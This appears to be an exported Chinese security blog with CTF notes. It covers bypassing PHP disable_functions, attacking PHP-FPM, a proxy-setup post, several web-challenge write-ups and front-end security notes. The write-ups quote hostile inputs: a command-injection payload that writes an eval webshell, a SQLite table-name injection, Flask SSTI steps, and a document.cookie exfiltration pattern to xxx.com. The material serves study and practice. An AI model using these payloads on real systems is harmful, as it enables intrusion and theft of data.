<h2 id="写-x2F-proc-x2F-self-x2F-mem"><a href="#写-x2F-proc-x2F-self-x2F-mem" class="headerlink" title="写&#x2F;proc&#x2F;self&#x2F;mem"></a>写&#x2F;proc&#x2F;self&#x2F;mem</h2><p>好像以前见到过类似的题目，偏二进制<br>PHP主进程是root的，但是子进程是www-data的，&#x2F;proc&#x2F;self&#x2F;mem属于www-data且权限是600，但&#x2F;proc&#x2F;self目录是root的，并且www-data无权限，所以正常情况下不能写入。<br>但是对于Nginx+php，且为低版本的php-fpm（PHP&lt;5.6），&#x2F;proc&#x2F;self&#x2F;属于www-data，可以通过写入GOT表的RCE</p>
<h3 id="二进制基础"><a href="#二进制基础" class="headerlink" title="二进制基础"></a>二进制基础</h3><p>二进制文件执行函数的时候要查两个表，一个PLT一个GOT。PLT是在编译时就确定下来了的，加载进内存的时候位于代码段。但由于动态链接之类的存在，在编译的时候并不能确定所有函数的地址，因为它甚至都还没加载进来，所以PLT表项并不存放函数的地址，而是指向GOT表的对应项，再由GOT表指向函数的真实地址。GOT表就是在运行时当调用一个函数的时候临时去查询的，因为PLT处于代码段不可修改，所以查到之后回填进GOT表，下次调用该函数就可以直接查询GOT表获取到地址。期间还有各种复杂的操作，比如什么GOT表前几项是就是用来进行函数地址查询的函数之类的，还有一种程序运行时不是等需要用到再去填GOT表，而是直接全部加载完然后把GOT表也变得只读防止被修改之类的</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>从上面已经可以看出来函数调用时其所用的是GOT表指向的地址，那么只要修改GOT表中某个函数，在执行那个函数的时候变成执行system之类的就搞定了（修改GOT表应该是pwn那边的常见操作才是。。。。）</p>
<p>抄一个攻击流程</p>
<blockquote>
<p>写一下劫持GOT表的步骤，这里直接写shellcode：<br>1.读&#x2F;proc&#x2F;self&#x2F;maps找到php和libc在内存中的基址<br>2.解析&#x2F;proc&#x2F;self&#x2F;exe找到php文件中readfile@got的偏移<br>3.找个能写的地址写shellcode<br>4.向readfile@got写shellcode地址覆盖<br>5.调用readfile</p>
</blockquote>
<p><a href="https://github.com/beched/php_disable_functions_bypass">利用脚本</a></p>
<h2 id="攻击PHP-FPM"><a href="#攻击PHP-FPM" class="headerlink" title="攻击PHP-FPM"></a>攻击PHP-FPM</h2><p>先了解一下前置知识</p>
<h3 id="PHP运行类型"><a href="#PHP运行类型" class="headerlink" title="PHP运行类型"></a>PHP运行类型</h3><p>PHP运行一般来说几个类型，CLI，php-cgi，php-fpm，Apache2.0handler<br>CLI是Command Line Interface，命令行情况下使用，不怎么常见<br>CGI是Common Gateway Interface，webserver和其他软件通信的<strong>协议</strong>（感觉是配合Nginx做反带之类的时候使用的），有一个强化版本fast-cgi。php的cgi就是来一个请求PHP起一个解释器进程处理，处理完了关掉，就很慢很憨批，所以fast-cgi就是开局直接启动多个解释器进程常驻内存，等待接收请求，处理完了也不关，继续等下一次的请求<br>php-cgi是早期的cgi管理器，因为cgi不太行所以这个也不太行<br>php-fpm是fast-cgi的管理器，一个master进程和一堆worker进程，master接收请求分配给worker，能动态调度启动worker进程，性能upup</p>
<p>使用Apache搭建PHP的时候使用的是Apache2handler，这个时候Apache是把PHP作为一个module加载进来的，属于是Apache自己内嵌PHP的解释器，就少了一步进程间通信，Apache直接自己开PHP解释器进行处理</p>
<h3 id="协议字段"><a href="#协议字段" class="headerlink" title="协议字段"></a>协议字段</h3><p>在通信时有几个比较有意思的字段是可以指定的<br><code>SCRIPT_FILENAME</code>，指定PHP执行的脚本文件路径，不过php5.3.9之后加入了fpm增加了security.limit_extensions，只允许执行如下后缀的文件<code>.php .php3 .php4 .php5 .php7</code><br><code>PHP_VALUE</code>，可以覆盖一些php.ini里面定义的属性，只能用于<code>PHP_INI_ALL</code>或<code>PHP_INI_PERDIR</code>类型的指令，具体看这个<a href="https://www.php.net/manual/zh/ini.list.php">php.ini 配置选项列表</a>，好用的比如<code>auto_prepend_file</code>,<code>open_basedir</code><br><code>PHP_ADMIN_VALUE</code>，和上面这个差不多，区别在于这个字段设置的属性不能在用户层面上被修改，也就是不能被ini_set()之类的函数在应用里被重写，也不能被.htaccess这种配置文件覆盖，常用的有<code>allow_url_include</code>，启用后支持include url形式的文件，经典php:&#x2F;&#x2F;input伪协议打通，以及<code>extension_dir</code>，指定扩展的.so直接bypass disable_function打通，<code>safe_mode</code>，在PHP5.4之后就被删除了的东西，启用后会限制某些函数的使用，比如move_upload_file,copy这些能把远程文件下到本地的函数，和一些system，shell_exec这类直接的命令执行函数，也不允许进行dl函数加载扩展文件(.dll or .so)</p>
<p>（找不到资料，但是感觉也许可以把低安全等级的变量也设置成PHP_ADMIN_VALUE不让动态的修改，不过<code>PHP_INI_SYSTEM</code>这个类型的属性理论上只允许在php.ini里面设置，这里能改真是玄幻）<br>与之对位的还有<code>PHP(_ADMIN)_FLAG</code>这么个属性，其区别在于其值只能为布尔值</p>
<p>可惜的是这些属性并不能覆盖disable_function</p>
<blockquote>
<p>PHP配置值通过 php_value 或者 php_flag 设置，并且会覆盖以前的值。请注意 disable_functions 或者 disable_classes 在 php.ini 之中定义的值不会被覆盖掉，但是会将新的设置附加在原有值的后面。<br>使用 php_admin_value 或者 php_admin_flag 定义的值，不能被 PHP 代码中的 ini_set() 覆盖。</p>
</blockquote>
<p><strong>修改PHP_(ADMIN_)VALUE会直接使得当前处理请求的fastCGI进程收到影响，如果多次请求就可能污染掉所有的进程，在重启fpm之前可能所有进程都会受到影响</strong></p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>因为之前说到使用CGI的时候，是webserver和CGI直接进行通信的，所以就存在进程间通信的问题，在Nginx的设置中有一个fastcgi_pass的设置，指定fastcgi所在的ip端口(或Unix socket)，PHP的fpm设置中可以配置fastcgi的监听位置，可以通过配置使得PHP也能前后端分离<br>fpm并不验证数据的来源，只要是发送到监听端口的数据就一律接受<br>PHP在fpm配置中若将监听端口写成0.0.0.0:9000，则接受来自任意ip的通信，可以通过伪装成Nginx服务器与php-fpm通信来执行命令，如果配置的是127.0.0.1:9000这种情况的可能就要靠SSRF打了<br><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">P神的利用脚本</a></p>
<p>SSRF也分两种，如果是监听的127.0.0.1这种ip地址就可以用gopher发TCP包打，如果直接监听Unix socket的话就得专门起一个socket去连接了</p>
<p>利用方案：1.自己随便上传一个其他位置的马然后用script_name指定进行利用<br>2.随便找一个PHP文件然后设置auto_prepend_file为php:&#x2F;&#x2F;input，allow_url_include为On打通</p>
<h3 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass_disable_function"></a>bypass_disable_function</h3><p>直接抄着那个脚本打并不能绕过Disable_function，只是做到了命令执行。因为这样子发过去的请求还是由原来的PHP解释器进行解析</p>
<p>但是可以通过FastCGI协议去让php-fpm加载我们自定义的扩展(.so文件)，而这个扩展肯定是不受disable_function限制的，做到任意命令执行<br>即之前提到的<code>extension_dir</code>和<code>extension</code></p>
<p>蚁剑有一个玄幻的插件，直接生成一个调用system函数的.so文件，然后输这么个命令<code>php -n -S 127.0.0.1:port -t /var/www/html</code>在目标机器上新开一个web服务，当然权限是www-data的，但是添加了<code>-n</code>参数指定不使用php.ini，可以绕过其设置的disable_function，并且还上传了一个antproxy.php文件将请求转发过去，实现比较方便的命令执行（不然应该是执行一次传一个.so吧，要我说继续搞那种接受环境变量做命令的方法也挺好的）<br>这次这个蓝帽杯本身是一个打.so扩展的pwn题，但是我看的wp成功的拿fpm打了一个.so加载的非预期打通了</p>
<h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><p>Foreign Function Interface，外部函数接口<br>PHP7.4的新特性，可以直接调用外部代码，RCTF 2019的Nextphp出的就是这个<br>需要ffi.enable&#x3D;true才能任意使用，否则只能使用在对应文件中使用</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/8669">ByteCTF WP-无需mail bypass disable_functions</a><br><a href="https://www.anquanke.com/post/id/197745">PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</a><br><a href="https://www.php.cn/php-weizijiaocheng-383223.html">php之CGI、FastCGI、APACHE2HANDLER、CLI运行模式的详解</a><br><a href="https://zhuanlan.zhihu.com/p/75114351">攻击PHP-FPM 实现Bypass Disable Functions</a><br><a href="https://security.tencent.com/index.php/blog/msg/166">RASP攻防 —— RASP安全应用与局限性浅析</a><br><a href="https://www.anquanke.com/post/id/208451">bypass disable_function多种方法+实例</a><br><a href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式</a><br><a href="https://www.anquanke.com/post/id/186186">从一道CTF学习Fastcgi绕过姿势</a><br><a href="https://forum.90sec.com/t/topic/129">PHP 连接方式介绍以及如何攻击 PHP-FPM</a><br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a><br><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.htm">PHP绕过open_basedir列目录的研究</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>bypass_disable_function</tag>
      </tags>
  </entry>
  <entry>
    <title>VPN与代理设置</title>
    <url>/%E4%BB%A3%E7%90%86.html</url>
    <content><![CDATA[<h1 id="VPN与代理设置"><a href="#VPN与代理设置" class="headerlink" title="VPN与代理设置"></a>VPN与代理设置</h1><p>最近被推荐了一个vpn，流量白嫖，于是开始研究其使用方式，所以研究了一下代理设置之类的东西，水一篇博客</p>
<p>使用工具:clash for windows<br>一般来说服务提供方都会有对应的转发规则，导入clash之后，会根据目的地对流量进行转发或直连，选择proxies里面的rule选项即可</p>
<h2 id="系统代理"><a href="#系统代理" class="headerlink" title="系统代理"></a>系统代理</h2><p>我感觉大多数人好像都习惯走系统代理，但是我感觉就不太行，系统代理这个名字听起来就感觉威力比较强大，感觉开了之后系统所有的流量都会过代理，就不太行，毕竟节点是白嫖的，不放心<br>就比如clash，在使用系统代理选项时，会在本地7890端口开一个代理服务器，并把系统代理设置为该端口<br>专门查了一下，系统代理会使得电脑上能走代理的软件流量均通过系统代理进行转发，不过一般来说只有浏览器这类型的软件会默认跟随代理（steam内置浏览器就可以跟），其他软件一般不会支持代理功能，所以也不怕QQ微信什么的流量会过代理；但是，可以白嫖流量的节点不一定是安全的，搞不好就都被记录下来了，因此我并不希望我所有的流量都通过代理（虽然可以使用规则时的特定流量过代理，但是就是感觉不舒服），这显然是不明智的</p>
<h3 id="11月18日新发现"><a href="#11月18日新发现" class="headerlink" title="11月18日新发现"></a>11月18日新发现</h3><p>暴雪更新居然会跟系统代理，我更新的时候发现网速100k&#x2F;s才感觉有问题，我服了，再也不用系统代理，我推荐switchyOmega</p>
<h2 id="SwitchyOmega"><a href="#SwitchyOmega" class="headerlink" title="SwitchyOmega"></a>SwitchyOmega</h2><p>Chrome常用插件，设置规则进行流量转发，可以创建一个直接指向7890端口的规则，应用该规则就可以直接把浏览器所有流量转发至代理软件，然后让代理软件决定流量走向，直连还是走代理。好像是一个比较不错的方案，但是总觉得多走了一步<br>即我直连流量还得多经过一次clash的判断再决定走哪条路，感觉就多进行了一步操作，出于完美主义的强迫症，进行额外的操作<br>选择switchyOmega的auto switch模式，导入规则<br>使用GitHub上已有的gfwlist进行流量转发判定，匹配规则的走vpn，虽然也是走规则，但是感觉没有进行一次内部通信的开销大（虽然我估计也感受不到开销的差距）<br><code>https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</code><br>然后就可以把clash直接开全局了</p>
<p>不得不说，谷歌比百度好用多了，很多好的资料都是在GitHub博客上的，而百度不爬github.io真是太愚蠢了，比如下面这个大哥的文章就对其他设置类型讲的很清楚<br><a href="https://vimcaw.github.io/blog/2018/03/12/Shadowsocks(R)%E8%AE%BE%E7%BD%AE%EF%BC%9A%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E3%80%81PAC%E3%80%81%E4%BB%A3%E7%90%86%E8%A7%84%E5%88%99/">https://vimcaw.github.io/blog/2018/03/12/Shadowsocks(R)%E8%AE%BE%E7%BD%AE%EF%BC%9A%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E3%80%81PAC%E3%80%81%E4%BB%A3%E7%90%86%E8%A7%84%E5%88%99/</a></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题刷题</title>
    <url>/%E5%88%B7%E9%A2%98%E5%88%B7%E9%A2%98.html</url>
    <content><![CDATA[<h1 id="刷题刷题"><a href="#刷题刷题" class="headerlink" title="刷题刷题"></a>刷题刷题</h1><p>考试结束，保研没着落，打工不想打，算法不想刷，学习不想学，进入自闭模式，重回buu，对一分题重拳出击（被一分题乱杀）<br>然后很多几十分的题就智障的不行。。。<br>buu有一点坑的就是题目描述上给了个链接，你也不知道这个题目给没给源码，有时候好像没给，一看就觉得题目太傻逼了，有时候事实上是给了的，不看源码自己就变成傻逼了</p>
<h2 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h2><p>orange出的题，因为是很老的比赛了所以现在的参考价值不大了，大概一个限制了12字符长度的VM沙箱，然后flag是在沙箱外通过require config加载进来的，想拿flag要绕12字符的沙箱逃逸命令执行，看起来有点离谱<br>这里涉及到的是nodejs的远古内存分配问题，nodejs在远古版本（Node.js v5.4.1&#x2F;v4.2.4）中的Buffer分配是就着以前用过的内存分配的，并且分配完了还不会初始化一下，也就意味着之前加载进内存然后被回收掉的内存位置可能被再次分配出来，并且还不会被初始化，原始数据还保留在那</p>
<p>这个外国大哥的文章讲了原理<a href="https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md">Node.js Buffer knows everything</a></p>
<blockquote>
<p>Buffer objects, unlike TypedArrays, are not zero filled if created with a new Buffer(size) constructor (or its alias Buffer(size)). The memory that they use as the underlying storage could (and will) contain stuff that there was before the creation of this Buffer, most importantly — parts of other, previously used Buffer objects that were garbage collected.<br>Also it should be taken into an account that pretty much every standard I&#x2F;O operation in Node.js uses Buffers — reading a file, requiring a module, receiving network traffic, passing stuff to the crypto module.</p>
</blockquote>
<p>所以利用方案就是在那12个字符内直接Buffer(9999)，把进程之前用过的内存都bababa倒出来，因为flag是require进来的，所以这个之前使用的内存也会在我们新开的buffer里面，直接在里面搜字符串获得flag<br>还有人用数组传参绕过了长度限制，数组长12第一个元素想写多长写多长</p>
<p>后来nodejs修了，buffer申请的时候都会自动初始化了，还给了一个<code>Buffer.allocUnsafe</code>函数来实现之前的分配buffer但是不初始化功能</p>
<p>所以这个题算沙箱逃逸吗？总觉得哪里怪怪的，还是说nodejs的沙箱实现和我的想象有点出入？</p>
<h2 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h2><p>额，我觉得这个题有点脑洞，有点坑<br>登录，登录进去可以添加event，event应该是写了数据库的，有三个可控属性，name，addr和important，important选那个就会展示哪个，抓包改important会直接302重定向，有一个flag路由但是会显示你不是admin<br>翻一下cookie有一个叫user的，长得像jwt，base64解码第一段就是双引号包裹的用户名，估计伪造一下cookie就能拿flag<br>jwt解不出来，估计是flask的cookie，格式差不多</p>
<p>问题就在于怎么伪造，flask的cookie我只能想办法去拿key才行，试了下ssti，三个输入点都不行。。。<br>然后看wp，important那里有非常诡异的操作，你输个<code>__dict__</code>，他就会输出奇怪的东西出来了。。。<br>结果还是ssti，但是ssti的格式是他写好的，是<code>0.&lt;important&gt;</code>这么个形式，0就是当前这个SQL查询的结果。。。这也太难猜了<br>然后就是正常ssti流程，<code>__init__.__globals__</code>，本来想builtins一把梭，直接命令执行拉倒了，结果发现不知道为什么eval那里只要一加括号就会出错，然后吃到一个重定向<br>然后老老实实<code>__init__.__globals__[app].config</code>看密钥，然后去伪造一个名字叫<code>&quot;admin&quot;</code>的cookie，然后拿以前下下来的脚本跑还跑不通，报错<br>翻了一下脚本怎么写的，他是默认输入是json格式的，所以会对需要加密的对象先按json格式解析一下，这里确实有点诡异，他这的数据就是一个字符串，所以解析的时候就会出问题，直接把解析那步注释掉对着原始数据进行加密就行了，拿到伪造的user cookie访问flag路由获取flag</p>
<h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>也是个flask cookie伪造，给了个文件下载，过滤了.py和.pyc后缀和flag.txt，本来想读&#x2F;proc&#x2F;self&#x2F;fd，读了半天没读出来，难道python启动之后读自己本身这个脚本是不会保留在fd里面的吗？<br>然后就不知道读哪里了，功能点很有限，不像上个题能ssti，所以看wp<br>wp说可以读&#x2F;proc&#x2F;self&#x2F;environ，这个里面放了当前进程的环境变量，里面有secret，是工程实现统一是这样的，还是因为题目动态部署的问题？以后没事就读一下这种东西，搞不好题目部署的时候把flag也写环境变量里面去了<br>读到了后面就都是简单东西了</p>
<h2 id="Zer0pts2020-phpNantokaAdmin"><a href="#Zer0pts2020-phpNantokaAdmin" class="headerlink" title="[Zer0pts2020]phpNantokaAdmin"></a>[Zer0pts2020]phpNantokaAdmin</h2><p>sqlite的注入题，不懂sqlite的神奇语法完全做不出来，学习了<br>晚点再搭个本地环境玩一下<br>看了半天源码，功能点就四个，创建数据库，插入数据，销毁数据库，查询整个数据库<br>销毁数据库没有用，查询数据库是直接select *的，且表名控制死了是用户创建的表，也没有用，插入数据用的prepare预处理，也不能用<br>只剩一个create，create的可控点还蛮多的，数据库名，列名，列的类型都可控，但是有一个waf，比较强力<code>/[\&quot;#&#39;()*,\\/\\\\`-]/i</code>，把单双引号反引号注释符小括号都干掉了，且限制了长度不超过32，SQL语句是这样的<code>CREATE TABLE &#123;\$table_name&#125; (dummy1 TEXT, dummy2 TEXT,`$column` $type);</code>，在create用户自定义的table之前，还创建了一个flag表插入了flag，但表名列名均未知<br>说实话也不知道怎么注入</p>
<p>然后看wp，然后发现这些操作我一个都不知道，然后从头来过</p>
<h3 id="sqlite入门"><a href="#sqlite入门" class="headerlink" title="sqlite入门"></a>sqlite入门</h3><p>先稍微入一下门再说吧。。。<br>本地搭一个环境，先来一个<code>.header on</code>和<code>.mode column</code>，让输出能够看起来比较正常，不然默认的输出真是把人眼睛看瞎了<br>sqlite的命令都是以点开头的，什么<code>.open &lt;dbname&gt;</code>，<code>.quit</code>之类的。。。<br>sqlite中有一个类似于mysql的information_schema的表，叫sqlite_master，记录了数据库表的一些信息，有这么五个字段<code>type name tbl_name rootpage sql</code><br>type表示记录类型，重点是table，其余类型比如index，trigger之类的是主键触发器什么的，这里着重关注type为table时剩下列的意义<br>name就是表名，tbl_name在type是table时也是表名，rootpage表示存在哪一页（没什么意义），sql为创建这个记录时执行的sql语句</p>
<p>一般来说这里就是用来找表名的，同时还可以通过创建表时的SQL语句找到列名</p>
<h3 id="sqlite的特殊引号"><a href="#sqlite的特殊引号" class="headerlink" title="sqlite的特殊引号"></a>sqlite的特殊引号</h3><p>单引号，双引号，方括号，反引号<br>单引号表示括起来的是一个字符串<br>双引号，方括号及反引号均表示括起来的是标识符<br>方括号是为了兼容access和MSSQL，反引号是兼容MySQL，详见文档<br><a href="https://www.sqlite.org/lang_keywords.html">sqlite文档</a></p>
<h3 id="sqlite的奇怪性质"><a href="#sqlite的奇怪性质" class="headerlink" title="sqlite的奇怪性质"></a>sqlite的奇怪性质</h3><p>当<code>select &lt;column_name&gt; from &lt;table_name&gt;</code>这样子的一个查询语句出现时，只要column_name是正确的，那么其后面就可以跟奇怪的垃圾数据而不影响查询结果，<strong>垃圾数据会被直接认为是当前这个列的一个别名</strong><br>如</p>
<pre class=" language-sqlite"><code class="language-sqlite">sqlite> select flag aaewqf23rf from test;
aaewqf23rf
----------
flag{test}
sqlite> select [flag]qwdef32r4 from test;
qwdef32r4 
----------
flag{test}
sqlite> select "flag"dqqfeq from test;
dqqfeq    
----------
flag{test}
</code></pre>
<p>以至于只需要闭合了<strong>引号</strong>，就算后面还有其他的引号也能正常使用</p>
<pre class=" language-sqlite"><code class="language-sqlite">sqlite> select [flag][('ade"dqwq] from test;
('ade"dqwq
----------
flag{test}
</code></pre>
<h3 id="create-table-as-select"><a href="#create-table-as-select" class="headerlink" title="create table as select"></a>create table as select</h3><p>好吧，以前真没见过这个语法，并且这个语法好像mysql，sqlite，pgsql全都支持。。。<br>从字面上看大概也能猜出来在说什么，也就是用一个select语句的结果来创建一个新的表<br>说到这，这个题的解也就呼之欲出了</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>create table处进行注入，并且和后面可控的type处里应外合，使用方括号对垃圾数据进行清理完成注入<br>拼出来的语句大概是这么个效果<br>create table <strong>[a] select sql[</strong>(dummy1 TEXT, dummy2 TEXT,`**a**` <strong>]from sqlite_master</strong>);<br>加粗部分为用户输入，在tablename和type处整一堆方括号，就能把这堆垃圾数据变为sql列的别名，然后以这个数据创建出我们自己的数据库<br>获得flag表名列名后故技重施即可获得flag</p>
<p>这里的利用其实有一个小小的点，session中存的tablename并非我们之前创建数据库时所输入的tablename，而是通过查sqlite_master中不等于flag表表名的表名，这样才能把这个表名给取出来</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>出题人的博客，不说中文看不懂啊。。。<a href="https://st98.github.io/diary/posts/2020-03-09-zer0pts-ctf-2020.html">zer0pts CTF 2020 で出題した問題の解説</a><br>暗羽姐姐的中文译本<a href="https://darkwing.moe/2020/03/10/phpNantokaAdmin-zer0pts-CTF-2020/">phpNantokaAdmin – zer0pts CTF 2020</a></p>
<h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><p>总觉得这个比赛我报名了的。。。是不是咕了？<br>简单的写文件，文件名限制在<code>[a-z\.]</code>没有斜杠所以不能目录穿越，写个php发现不能解析，估计是配置了就解析index.php，每次写文件之前会把当前目录下index.php文件以外的文件都删掉，所以也只能写一个，尝试覆盖index.php，没成功，那就只剩写htaccess了。<br>看内容里面file flag之类的过滤，看起来也觉得比较像写htaccess，并且最后还给文件里拼了一行垃圾</p>
<p>一行垃圾很好解决，htaccess经典操作之反斜杠转义换行符，注释去除单行垃圾。想起之前XNUCA的三行垃圾写htaccess，那个真是玄幻windows defender操作删除<br>关键字过滤也很简单，同样是反斜线转义换行符，中间插了个换行符也不影响解析<br>那么注释里面塞一个PHP语句然后<code>php_value auto_append_file xxx</code>就行，但是Apache默认配置看不到htaccess，这里想看一下写进去的东西是什么，浪费了半天。。。<br>什么Require all granted，Allow from all都上了，不太好用，最后试了一句<code>Satisfy Any</code>，看得见htaccess内容了<br>本来想直接把htaccess当PHP处理，塞了句<code>SetHandler application x-httpd-php</code>上去，本地是跑通了，远程没跑通，估计是配置了只解析index.php的配置不是用这句覆盖的？</p>
<p>还有一个坑点，auto_append_file，本地后面的路径直接写绝对相对都跑的通，远程环境要加一个引号把路径括起来才能</p>
<h2 id="羊城杯2020-easyphp2"><a href="#羊城杯2020-easyphp2" class="headerlink" title="[羊城杯2020]easyphp2"></a>[羊城杯2020]easyphp2</h2><p>emmm，先上来给一个很明显的文件包含，读了一下发现&#x2F;etc&#x2F;passwd发现没拼目录，试了下伪协议，有waf，把base64，rot13什么的都给ban了（这里记一下rot13的用法是string.rot13）<br>然后是喜闻乐见的二次编码绕过，我把这茬给忘了。。。只要能用伪协议应该就能二次编码绕过吧，这是伪协议在底层处理的时候对<strong>过滤器</strong>进行了额外的url解码导致的，所以之前有一次比赛把php ban了就不能二次编码绕过<br>读源码，不知道为什么index.php就是读不到？把这个GWHT.php读了，要先给一个ENV里面的PASS，然后后面有一个命令执行，这个有点坑，读<code>/proc/self/environ</code>读不出来，不知道pass去哪找，结果看wp是robots.txt里面有一个提示，读了之后就能看到pass是GWHT。。。。虽然有直接猜出来的可能，但是还是想吐槽这个点好坑<br>命令执行大概就是<code>exec(&quot;printf &#39;$content&#39;|wc -c&quot;)</code>，exec的话命令执行结果是在返回值里面，并且还整了个wc，就等于是个无回显命令执行呗，过滤了分号&lt;?php这些没什么用的东西，直接把单引号一闭合反引号命令执行就是了，很简单的.jpg<br>无回显就把结果写到文件里，不知道能不能弹shell因为一开始写了个<code>ini_set(&#39;max_execution_time&#39;, 5);</code>，索性再写一个shell弹回来就是了，写的时候注意各种引号直接的关系和转义$，单行的PHP也不需要分号，短标签过&lt;?php的waf，这里明明写进去的文件权限是644，但是我却不能追加写入，很诡异嗷，不然也可以追加写入过waf<br><code>&#39;`echo%20&quot;&lt;?=eval(\\$_REQUEST[a])?&gt;&quot;%20&gt;test1.php`&#39;</code><br>然后蚁剑连上去方便一点，根目录有一个GWHT文件夹，里面一堆垃圾空文件夹，有一个目录下面有flag，但是是root:GWHT 440权限，GWHT文件夹里面有一个README给了密码的hash，但是cmd5查出来告诉你是收费记录。emmm，看wp，是GWHTCTF，蚁剑的虚拟终端其实是通过命令执行然后打印出来的，所以还要再自己弹一个交互式的shell回来，登录GWHT用户，拿到flag</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全笔记</title>
    <url>/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h1 id="前端安全笔记"><a href="#前端安全笔记" class="headerlink" title="前端安全笔记"></a>前端安全笔记</h1><p>打DiceCTF的全前端选择打到自闭，然后开始临时学前端，翻到了自己之前写的东西发现不仅很简陋还有写错的部分。。。。整体改一下</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="第一、三方cookie"><a href="#第一、三方cookie" class="headerlink" title="第一、三方cookie"></a>第一、三方cookie</h3><p>第一方cookie指的是由网络用户访问的域创建的cookie<br>第三方cookie即第三方网站引导发出的cookie</p>
<p>CSRF的防御手段应该是csrf_token和samesite</p>
<h3 id="csrf-token"><a href="#csrf-token" class="headerlink" title="csrf_token"></a>csrf_token</h3><p>csrf_token是通过页内嵌入标识防止冒用cookie的，不赘述</p>
<h3 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h3><p>samesite则是一种浏览器安全防御措施，服务器通过在header中提交SameSite决定该cookie是否在请求时会被发出<br>SameSite有三种模式，Strict，Lax和None。<br>Strict超级严格，绝不转发第三方cookie，比如你从百度搜索到B站，那么从百度点进去的就一定处于未登录状态，None就是关掉，就当无事发生。<br>现代浏览器大多采用默认的Lax模式，大多数情况下不给转发第三方cookie，但为了方便使用仍允许部分，如下<br>&lt;a href&#x3D;”…”&gt;链接标签<br>&lt;link rel&#x3D;”prerender” href&#x3D;”…”&#x2F;&gt;预加载<br>&lt;form method&#x3D;”GET” action&#x3D;”…”&gt;仅get表单，POST表单不行，提交表单会导致跳转<br><strong>lax模式还是能通过js自动提交表单来进行CSRF的</strong></p>
<h2 id="XSS-cookie窃取"><a href="#XSS-cookie窃取" class="headerlink" title="XSS cookie窃取"></a>XSS cookie窃取</h2><h3 id="HTTPOnly"><a href="#HTTPOnly" class="headerlink" title="HTTPOnly"></a>HTTPOnly</h3><p>cookie设置为httpOnly之后，cookie无法被页面脚本获取，所以我们经典的xss使用&lt;src img&#x3D;xxx.com?a&#x3D;document.cookie发送cookie的计划就不通了<br>但是还是能用GET，POST表单或者location.href方式CSRF<br><del>说起来GET表单和location.href好像没什么区别</del></p>
<h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><p>Content-Security-Policy内容安全策略，用于限定当前页面哪些脚本内被执行，外部引用的脚本从哪引用的可以执行，防止了代码的注入和引用<br>包括一些default-src， script-src之类的，限制能够请求的资源的范围，如果请求的src不在允许范围内，则请求不会被发出，fetch等函数同样受到限制<br>但是如果绕过了CSP可以执行脚本，还是可以location.href之类的跳转或者GET，POST表单提交跳转之类的把cookie偷出来，毕竟跳转就不算是请求资源了</p>
<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>如下所说的页面指页面上的JavaScript脚本</p>
<p>同源策略主要功能为<br>https和http的同源如下<br>浏览器禁止跨域页面直接的读写，主要表现为禁止ajax跨域读，DOM的获取<br>DOM获取常见的例子为iframe，当主页面使用iframe加载子页面时，父页面无法获取到子页面的DOM文档，无法对其操作，拿不到他的cookie<br>而ajax请求同理，当ajax请求为跨域请求时，当前页面无法获得其返回内容（请求可以被发出）<br>总而言之，请求的发出并不能被阻止，浏览器能做的不过是隔离请求的应答和页面直接的交互，目的在于<strong>阻止请求得到的内容被页面获取</strong></p>
<p>浏览器不止支持上述协议，比如还有file协议。据说在很古老的年代，file协议的同源域是本机，就导致file协议可以访问系统中的任意文件，最后就变成了file的同源是本文件，然后好像还可以用软连接读取任意文件，最后的结局就是任何文件不同源了，自己和自己也不同源</p>
